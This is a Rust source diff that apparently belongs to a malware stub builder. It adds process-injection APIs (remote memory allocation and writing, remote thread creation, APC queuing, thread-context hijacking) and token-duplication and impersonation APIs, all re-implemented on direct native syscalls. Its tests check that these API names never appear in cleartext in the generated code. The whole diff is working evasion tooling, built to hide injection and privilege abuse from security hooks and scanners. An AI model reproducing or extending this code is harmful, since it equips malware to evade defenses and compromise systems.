@@ -181,6 +181,82 @@ pub const CATALOGUE: &[ApiEntry] = &[
         strategy: Strategy::Handler,
         nt: None,
     },
+    // Cross-process injection: the Win32 wrappers re-implemented on the native
+    // calls the syscall layer already carries.
+    ApiEntry {
+        dll: "kernel32",
+        func: "VirtualAllocEx",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtAllocateVirtualMemory"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "WriteProcessMemory",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtWriteVirtualMemory"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "VirtualProtectEx",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtProtectVirtualMemory"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "CreateRemoteThread",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtCreateThreadEx"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "QueueUserAPC",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtQueueApcThread"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "ResumeThread",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtResumeThread"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "SuspendThread",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtSuspendThread"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "GetThreadContext",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtGetContextThread"),
+    },
+    ApiEntry {
+        dll: "kernel32",
+        func: "SetThreadContext",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtSetContextThread"),
+    },
+    // Token manipulation. `LogonUser` is deliberately absent: it is a
+    // LSA/ALPC interaction with no single Nt* equivalent.
+    ApiEntry {
+        dll: "advapi32",
+        func: "OpenProcessToken",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtOpenProcessToken"),
+    },
+    ApiEntry {
+        dll: "advapi32",
+        func: "DuplicateTokenEx",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtDuplicateToken"),
+    },
+    ApiEntry {
+        dll: "advapi32",
+        func: "ImpersonateLoggedOnUser",
+        strategy: Strategy::RouteToNt,
+        nt: Some("NtSetInformationThread"),
+    },
 ];
 
 /// Resolved `build.stub.api_resolution` configuration.
@@ -432,6 +508,42 @@ fn proxy_body(index: usize, entry: &ApiEntry, strings: &StringsConfig) -> String
             .replace("$ID$", &id)
             .replace("$COMMENT$", &comment),
         "GetProcAddress" => handler_proxy(index, entry, strings),
+        "VirtualAllocEx" => WRAPPER_VIRTUAL_ALLOC_EX
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "WriteProcessMemory" => WRAPPER_WRITE_PROCESS_MEMORY
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "VirtualProtectEx" => WRAPPER_VIRTUAL_PROTECT_EX
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "CreateRemoteThread" => REBUILD_CREATE_REMOTE_THREAD
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "QueueUserAPC" => WRAPPER_QUEUE_USER_APC
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "ResumeThread" => WRAPPER_RESUME_THREAD
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "SuspendThread" => WRAPPER_SUSPEND_THREAD
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "GetThreadContext" => WRAPPER_GET_THREAD_CONTEXT
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "SetThreadContext" => WRAPPER_SET_THREAD_CONTEXT
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "OpenProcessToken" => WRAPPER_OPEN_PROCESS_TOKEN
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "DuplicateTokenEx" => WRAPPER_DUPLICATE_TOKEN_EX
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
+        "ImpersonateLoggedOnUser" => WRAPPER_IMPERSONATE_LOGGED_ON_USER
+            .replace("$ID$", &id)
+            .replace("$COMMENT$", &comment),
         // Unreachable for the shipped catalogue; kept so an entry without a body
         // is visible in the generated source instead of referencing a missing
         // function.
@@ -621,6 +733,329 @@ const REBUILD_OPEN_PROCESS: &str = r#"    /// $COMMENT$: rebuilt on NtOpenProces
         );
         if status >= 0 {
             return handle;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const WRAPPER_VIRTUAL_ALLOC_EX: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtAllocateVirtualMemory
+    /// (NTSTATUS -> base pointer, `GetLastError` preserved).
+    extern "system" fn $ID$(
+        process: windows::Win32::Foundation::HANDLE,
+        address: *mut core::ffi::c_void,
+        size: usize,
+        alloc_type: u32,
+        protect: u32,
+    ) -> *mut core::ffi::c_void {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let mut base = address;
+        let mut region = size;
+        let status = crate::nt_alloc_vm(process, &mut base, 0, &mut region, alloc_type, protect);
+        if status >= 0 {
+            return base;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        core::ptr::null_mut()
+    }
+"#;
+
+const WRAPPER_WRITE_PROCESS_MEMORY: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtWriteVirtualMemory
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved, count kept).
+    extern "system" fn $ID$(
+        process: windows::Win32::Foundation::HANDLE,
+        base: *const core::ffi::c_void,
+        buffer: *const core::ffi::c_void,
+        size: usize,
+        written: *mut usize,
+    ) -> i32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let status = crate::nt_write_vm(process, base, buffer, size, written);
+        if status >= 0 {
+            return 1;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const WRAPPER_VIRTUAL_PROTECT_EX: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtProtectVirtualMemory
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved, old protection kept).
+    extern "system" fn $ID$(
+        process: windows::Win32::Foundation::HANDLE,
+        base: *mut core::ffi::c_void,
+        size: usize,
+        new_protect: u32,
+        old_protect: *mut u32,
+    ) -> i32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let status = crate::nt_protect_vm(process, base, size, new_protect, old_protect);
+        if status >= 0 {
+            return 1;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const REBUILD_CREATE_REMOTE_THREAD: &str = r#"    /// $COMMENT$: rebuilt on NtCreateThreadEx (`CREATE_SUSPENDED` translated to
+    /// the native flag). `lpThreadAttributes` and `lpThreadId` are not honored:
+    /// the native call takes no security attributes and returns no thread id.
+    extern "system" fn $ID$(
+        process: windows::Win32::Foundation::HANDLE,
+        _attributes: *const core::ffi::c_void,
+        stack_size: usize,
+        start: *mut core::ffi::c_void,
+        parameter: *mut core::ffi::c_void,
+        creation_flags: u32,
+        _thread_id: *mut u32,
+    ) -> isize {
+        const WIN32_CREATE_SUSPENDED: u32 = 0x0000_0004;
+        const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x0000_0001;
+        const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
+
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let flags = if creation_flags & WIN32_CREATE_SUSPENDED != 0 {
+            THREAD_CREATE_FLAGS_CREATE_SUSPENDED
+        } else {
+            0
+        };
+        let mut handle: isize = 0;
+        let status = crate::nt_create_thread_ex_native(
+            &mut handle as *mut isize as *mut windows::Win32::Foundation::HANDLE,
+            THREAD_ALL_ACCESS,
+            core::ptr::null(),
+            process,
+            start,
+            parameter,
+            flags,
+            0,
+            stack_size,
+            0,
+            core::ptr::null(),
+        );
+        if status >= 0 {
+            return handle;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const WRAPPER_QUEUE_USER_APC: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtQueueApcThread
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
+    extern "system" fn $ID$(
+        routine: *const core::ffi::c_void,
+        thread: windows::Win32::Foundation::HANDLE,
+        data: usize,
+    ) -> u32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let status = crate::nt_queue_apc(
+            thread,
+            routine,
+            data as *mut core::ffi::c_void,
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+        );
+        if status >= 0 {
+            return 1;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const WRAPPER_RESUME_THREAD: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtResumeThread (NTSTATUS ->
+    /// previous suspend count, `GetLastError` preserved).
+    extern "system" fn $ID$(thread: windows::Win32::Foundation::HANDLE) -> u32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let mut previous = 0u32;
+        let status = crate::nt_resume_thread(thread, &mut previous);
+        if status >= 0 {
+            return previous;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        u32::MAX
+    }
+"#;
+
+const WRAPPER_SUSPEND_THREAD: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtSuspendThread (NTSTATUS ->
+    /// previous suspend count, `GetLastError` preserved).
+    extern "system" fn $ID$(thread: windows::Win32::Foundation::HANDLE) -> u32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let mut previous = 0u32;
+        let status = crate::nt_suspend_thread(thread, &mut previous);
+        if status >= 0 {
+            return previous;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        u32::MAX
+    }
+"#;
+
+const WRAPPER_GET_THREAD_CONTEXT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtGetContextThread
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
+    extern "system" fn $ID$(
+        thread: windows::Win32::Foundation::HANDLE,
+        context: *mut core::ffi::c_void,
+    ) -> i32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let status = crate::nt_get_context_thread(thread, context);
+        if status >= 0 {
+            return 1;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const WRAPPER_SET_THREAD_CONTEXT: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtSetContextThread
+    /// (NTSTATUS -> BOOL, `GetLastError` preserved).
+    extern "system" fn $ID$(
+        thread: windows::Win32::Foundation::HANDLE,
+        context: *mut core::ffi::c_void,
+    ) -> i32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let status = crate::nt_set_context_thread(thread, context);
+        if status >= 0 {
+            return 1;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const WRAPPER_OPEN_PROCESS_TOKEN: &str = r#"    /// $COMMENT$: rebuilt on NtOpenProcessToken (the Win32 wrapper adds no
+    /// object attributes; NTSTATUS -> BOOL, `GetLastError` preserved).
+    extern "system" fn $ID$(
+        process: windows::Win32::Foundation::HANDLE,
+        desired_access: u32,
+        token: *mut core::ffi::c_void,
+    ) -> i32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let status = crate::nt_open_process_token(process, desired_access, core::ptr::null(), token);
+        if status >= 0 {
+            return 1;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const WRAPPER_DUPLICATE_TOKEN_EX: &str = r#"    /// $COMMENT$: rebuilt on NtDuplicateToken. `lpTokenAttributes` is ignored
+    /// (the native call takes no security attributes); the impersonation level
+    /// and token type pass through unchanged (same enum values).
+    extern "system" fn $ID$(
+        existing: windows::Win32::Foundation::HANDLE,
+        desired_access: u32,
+        _attributes: *const core::ffi::c_void,
+        impersonation_level: i32,
+        token_type: i32,
+        new_token: *mut core::ffi::c_void,
+    ) -> i32 {
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let status = crate::nt_duplicate_token(
+            existing,
+            desired_access,
+            core::ptr::null(),
+            impersonation_level,
+            token_type,
+            new_token,
+        );
+        if status >= 0 {
+            return 1;
+        }
+        unsafe {
+            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
+                windows::Win32::Foundation::RtlNtStatusToDosError(
+                    windows::Win32::Foundation::NTSTATUS(status),
+                ),
+            ));
+        }
+        0
+    }
+"#;
+
+const WRAPPER_IMPERSONATE_LOGGED_ON_USER: &str = r#"    /// $COMMENT$: rebuilt on NtSetInformationThread(ThreadImpersonationToken),
+    /// the native shape of ImpersonateLoggedOnUser (NTSTATUS -> BOOL).
+    extern "system" fn $ID$(token: windows::Win32::Foundation::HANDLE) -> i32 {
+        const THREAD_IMPERSONATION_TOKEN: i32 = 5;
+
+        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
+        let status = crate::nt_set_info_thread(
+            unsafe { windows::Win32::System::Threading::GetCurrentThread() },
+            THREAD_IMPERSONATION_TOKEN,
+            &token as *const windows::Win32::Foundation::HANDLE as *const core::ffi::c_void,
+            core::mem::size_of::<windows::Win32::Foundation::HANDLE>() as u32,
+        );
+        if status >= 0 {
+            return 1;
         }
         unsafe {
             windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
@@ -1086,5 +1521,71 @@ mod tests {
             config.required_syscalls(),
             vec!["NtReadVirtualMemory", "NtOpenProcess"]
         );
+    }
+
+    #[test]
+    fn injection_entries_route_to_the_existing_syscalls() {
+        let config = proxy_config(&[
+            "kernel32!VirtualAllocEx",
+            "kernel32!WriteProcessMemory",
+            "kernel32!CreateRemoteThread",
+            "kernel32!QueueUserAPC",
+        ]);
+        assert_eq!(
+            config.required_syscalls(),
+            vec![
+                "NtAllocateVirtualMemory",
+                "NtWriteVirtualMemory",
+                "NtCreateThreadEx",
+                "NtQueueApcThread"
+            ]
+        );
+
+        let block = render_block(&config, &xor_strings());
+        assert!(block.contains("crate::nt_alloc_vm"), "{block}");
+        assert!(block.contains("crate::nt_write_vm"), "{block}");
+        assert!(
+            block.contains("crate::nt_create_thread_ex_native"),
+            "{block}"
+        );
+        assert!(block.contains("crate::nt_queue_apc"), "{block}");
+        assert!(!block.contains('$'), "leftover placeholder: {block}");
+    }
+
+    #[test]
+    fn token_entries_route_to_the_new_syscalls() {
+        let config = proxy_config(&[
+            "advapi32!OpenProcessToken",
+            "advapi32!DuplicateTokenEx",
+            "advapi32!ImpersonateLoggedOnUser",
+        ]);
+        assert_eq!(
+            config.required_syscalls(),
+            vec![
+                "NtOpenProcessToken",
+                "NtDuplicateToken",
+                "NtSetInformationThread"
+            ]
+        );
+
+        let block = render_block(&config, &xor_strings());
+        assert!(block.contains("crate::nt_open_process_token"), "{block}");
+        assert!(block.contains("crate::nt_duplicate_token"), "{block}");
+        assert!(block.contains("crate::nt_set_info_thread"), "{block}");
+        assert!(!block.contains('$'), "leftover placeholder: {block}");
+    }
+
+    #[test]
+    fn injection_and_token_names_stay_out_of_the_code() {
+        let config = proxy_config(&[
+            "kernel32!VirtualAllocEx",
+            "kernel32!CreateRemoteThread",
+            "advapi32!DuplicateTokenEx",
+        ]);
+        let block = render_block(&config, &xor_strings());
+        let code = code_only(&block);
+        for name in ["VirtualAllocEx", "CreateRemoteThread", "DuplicateTokenEx"] {
+            assert!(!code.contains(name), "cleartext name leaked: {name}");
+        }
     }
 }
